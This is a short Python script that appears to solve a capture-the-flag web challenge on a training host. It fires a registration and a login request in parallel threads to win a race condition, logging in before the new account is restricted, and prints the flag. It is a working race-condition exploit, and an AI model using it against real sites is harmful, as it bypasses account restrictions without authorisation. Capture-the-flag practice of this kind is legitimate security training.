import requests
import IPython
import threading
import random
import string

host = "http://aart.training.jinblack.it"

def register(user,pwd):
    url = "%s/register.php"%host
    r = requests.post( url , data = {'username': user , 'password': pwd})
    if "SUCCESS!" in r.text:
        return True
    return False
    #IPython.embed()

def login(user,pwd):
    url = "%s/login.php"%host
    r = requests.post(url , data = {'username': user, 'password': pwd})
    if "flag{" in r.text:
        print(r.text)

def randomString(seed):
    return''.join(random.choices(string.ascii_uppercase+string.ascii_lowercase + string.digits, k = seed))

#IDEA : the login must happen BEFORE the restriction of the account during the user registration happens
#while True:
username = randomString(11)
passwd = randomString(10)
    #please note that you need to change the username for each attempt
rx = threading.Thread(target = register , args = (username,passwd))
lx = threading.Thread(target = login , args = (username,passwd))


rx.start()
lx.start()
#I don't know why it doesn't work with the while ...

#register('zerocalcare','zerocalcare')
#login('zerocalcare', 'zerocalcare')
